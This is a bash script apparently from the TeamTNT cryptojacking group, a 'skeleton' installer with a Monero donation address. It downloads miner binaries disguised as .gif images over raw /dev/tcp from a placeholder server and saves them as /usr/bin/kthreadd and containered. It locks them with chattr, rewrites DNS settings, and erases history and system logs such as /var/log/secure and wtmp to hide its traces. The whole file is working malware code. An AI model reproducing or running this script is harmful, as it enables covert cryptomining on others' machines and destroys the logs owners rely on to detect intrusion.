#!/bin/bash
#
#	TITLE:		TeamTNT.Skeleton.sh.txt
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	1.00.0
#	DATE:		28.10.2021
#
#	SRC:		https://teamtnt.red/scripte/SetupWithBash.sh
#
#	DONATE_XMR:     46W59PibkXQckX7LtXT8p4ircXZgDLVR8fZtpS9ZLBbz9hjFhQwijwdi5chKAco59VVUQHSqjpkUuZMYa2J66AKUDUHiRrU
#
########################################################################

if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi

ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
LC_ALL=en_US.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin


########################################################################

TNT_HTTP_01_SRC="http://SERVER/DIR"
TNT_REMOTE_SAVE="/usr/bin"

########################################################################


function INT_MAIN(){
TNT_DNS_MOD
TNT_CURL_WGET_FIX
TNT_SETUP_SOME_PACKS
TNT_PAYLOAD_PLACE
TNT_CLEAN_TRACES
}


function TNT_DLBYPASS() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

function TNT_PACKMAN_CLEANER(){
if type apk 2>/dev/null 1>/dev/null; then 
apk update 2>/dev/null 1>/dev/null
fi
if type apt-get 2>/dev/null 1>/dev/null; then 
apt-get clean 2>/dev/null 1>/dev/null
apt-get autoclean 2>/dev/null 1>/dev/null
apt-get autoremove -y 2>/dev/null 1>/dev/null
apt-get update --fix-missing 2>/dev/null 1>/dev/null
fi
if type yum 2>/dev/null 1>/dev/null; then
yum clean all 2>/dev/null 1>/dev/null
rm -rf /var/cache/yum 2>/dev/null 1>/dev/null
fi
export TTPMC="done"
}

function TNT_PACKMAN(){
BINARY=$1
if [ "$(id -u)" == "0" ]; then
	if ! type $BINARY 2>/dev/null 1>/dev/null; then 
		if [[ -z "$TTPMC" ]]; then
			TNT_PACKMAN_CLEANER
		fi
		if type apk 2>/dev/null 1>/dev/null; then 
			APKPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'apk' | head -n 1 | sed 's#<code>apk add ##g' | sed 's#</code>##g')
			apk add $APKPACK 2>/dev/null 1>/dev/null
		fi
		if type apt-get 2>/dev/null 1>/dev/null; then 
			APTPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'apt-get' | head -n 1 | sed 's#<code>apt-get install ##g' | sed 's#</code>##g')
			apt-get install -y $APTPACK 2>/dev/null 1>/dev/null
			apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null
		fi
		if type yum 2>/dev/null 1>/dev/null; then
			YUMPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'yum' | head -n 1 | sed 's#<code>yum install ##g' | sed 's#</code>##g')
			yum install -y $YUMPACK 2>/dev/null 1>/dev/null
			yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null
		fi
	fi
fi
}

function TNT_UNLOCK(){
TNT_TO_UNLOCK=$1
TNT_LOCKTYP=$2
if [[ ! -z "$1" ]]; then
if [[ "$TNT_LOCKTYP" = "dir" ]]; then
if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
else 
if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
fi
fi
}

function TNT_LOCK(){
TNT_TO_LOCK=$1
TNT_LOCKTYP=$2
if [[ ! -z "$1" ]]; then
if [[ "$TNT_LOCKTYP" = "dir" ]]; then
if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
else
if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
fi
fi
}

function TNT_GIVE_EXEC(){
TNT_MAKE_EXEC=$1
python -c "import os,sys,stat;os.chmod('/usr/bin/chmod',stat.S_IRWXU)"
	if [[ "$(which chmod 2>/dev/null 1>/dev/null)" = "0" ]]; then chmod 755 $TNT_MAKE_EXEC 2>/dev/null 1>/dev/null; fi
	if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntchmod 755 $TNT_MAKE_EXEC 2>/dev/null 1>/dev/null; fi
		if [[ "$(command -v chmod 2>/dev/null 1>/dev/null)" = "0" ]]; then chmod 755 $TNT_MAKE_EXEC 2>/dev/null 1>/dev/null; fi
		if [[ "$(command -v tntchmod 2>/dev/null 1>/dev/null)" = "0" ]]; then tntchmod 755 $TNT_MAKE_EXEC 2>/dev/null 1>/dev/null; fi


}

function TNT_REMOVE(){
TNT_TO_RM=$1
TNT_RMTYP=$2
if [[ ! -z "$1" ]]; then
if [[ "$TNT_RMTYP" = "dir" ]]; then
TNT_UNLOCK $TNT_RMTYP dir
chmod 1777 $TNT_RMTYP -r 2>/dev/null 1>/dev/null 
rm -fr $TNT_RMTYP 2>/dev/null 1>/dev/null 
else
TNT_UNLOCK $TNT_RMTYP
chmod 1777 $TNT_RMTYP 2>/dev/null 1>/dev/null 
rm -f $TNT_RMTYP 2>/dev/null 1>/dev/null 
fi
fi
}

function TNT_CURL_WGET_FIX(){
cp /bin/cd1 /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cd1 /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cd1 /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cd1 /usr/curl 2>/dev/null 1>/dev/null
cp /bin/cur /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cur /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cur /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cur /usr/curl 2>/dev/null 1>/dev/null
cp /bin/cdl /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cdl /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cdl /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cdl /usr/curl 2>/dev/null 1>/dev/null

cp /bin/wd1 /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wd1 /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wd1 /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wd1 /usr/wget 2>/dev/null 1>/dev/null
cp /bin/wge /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wge /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wge /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wge /usr/wget 2>/dev/null 1>/dev/null
cp /bin/wdl /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wdl /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wdl /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wdl /usr/wget 2>/dev/null 1>/dev/null
}

function TNT_IER(){
# IF_EXIST_REMOVE
TNT_TEXT=$1
TNT_FILE=$2
if [[ "$(grep $TNT_TEXT $TNT_FILE)" ]]; then
TNT_UNLOCK $TNT_FILE
sed -i '/'$TNT_TEXT'/d' $TNT_FILE 2>/dev/null
TNT_LOCK $TNT_FILE
fi
}

function TNT_DNS_MOD(){

#if [[ ! "$(grep '45.9.148.108 chimaera.cc' /etc/hosts)" ]]; then TNT_IER chimaera /etc/hosts; TNT_UNLOCK /etc/hosts
#echo "45.9.148.108 chimaera.cc" >> /etc/hosts 2>/dev/null; TNT_LOCK /etc/hosts; fi

#if [[ ! "$(grep '45.9.148.108 teamtnt.red' /etc/hosts)" ]]; then TNT_IER teamtnt /etc/hosts; TNT_UNLOCK /etc/hosts
#echo "45.9.148.108 teamtnt.red" >> /etc/hosts 2>/dev/null; TNT_LOCK /etc/hosts; fi

if [[ ! "$(grep 'nameserver 8.8.8.8\|nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then 
TNT_IER nameserver /etc/resolv.conf; fi

if [[ ! "$(grep 'nameserver 8.8.8.8' /etc/resolv.conf)" ]]; then TNT_UNLOCK /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null; TNT_LOCK /etc/resolv.conf; fi

if [[ ! "$(grep 'nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then TNT_UNLOCK /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null; TNT_LOCK /etc/resolv.conf; fi
}

function TNT_CLEAN_TRACES(){
TNT_UNLOCK /tmp/ dir
TNT_REMOVE /tmp/*
TNT_REMOVE /tmp/.*
	TNT_UNLOCK /var/tmp/ dir
	TNT_REMOVE /var/tmp/*
	TNT_REMOVE /var/tmp/.*
TNT_UNLOCK /var/log/secure
TNT_REMOVE /var/log/secure
touch /var/log/secure
	TNT_UNLOCK /var/log/wtmp
	TNT_REMOVE /var/log/wtmp
	touch /var/log/wtmp
TNT_UNLOCK /var/spool/mail/root
TNT_REMOVE /var/spool/mail/root
touch /var/spool/mail/root
if [[ ! -z "$MAIL" ]]; then
TNT_UNLOCK $MAIL
TNT_REMOVE $MAIL
touch $MAIL ; fi
	TNT_UNLOCK ~/
	TNT_UNLOCK ~/.bash_history
	TNT_REMOVE ~/.bash_history
	touch ~/.bash_history
	TNT_LOCK ~/.bash_history
history -c
clear
}

function TNT_SETUP_SOME_PACKS(){
TNT_PACKMAN bash
TNT_PACKMAN curl
TNT_PACKMAN lspci
TNT_PACKMAN ps
TNT_PACKMAN chmod
TNT_PACKMAN chattr
TNT_PACKMAN ssh
}




function TNT_DL_XMRIGCC_BIN(){
if [[ ! -d "$TNT_REMOTE_SAVE" ]]; then mkdir -p $TNT_REMOTE_SAVE 2>/dev/null 1>/dev/null; fi
    if [[ ! -f "$TNT_REMOTE_SAVE/kthreadd" ]]; then
    TNT_DLBYPASS $TNT_HTTP_01_SRC/img/kthreadd.gif > $TNT_REMOTE_SAVE/kthreadd
    TNT_GIVE_EXEC $TNT_REMOTE_SAVE/kthreadd 2>/dev/null
    chattr +i $TNT_REMOTE_SAVE/kthreadd 2>/dev/null ; fi
        if [[ ! -f "$TNT_REMOTE_SAVE/containered" ]]; then
        TNT_DLBYPASS $TNT_HTTP_01_SRC/img/containered.gif > $TNT_REMOTE_SAVE/containered
        TNT_GIVE_EXEC $TNT_REMOTE_SAVE/containered 2>/dev/null
        chattr +i $TNT_REMOTE_SAVE/containered 2>/dev/null ; fi
}


function TNT_SYSTEMDSERVICE(){


}


function TNT_PAYLOAD_PLACE(){

TNT_DL_XMRIGCC_BIN
TNT_SYSTEMDSERVICE



}



INT_MAIN


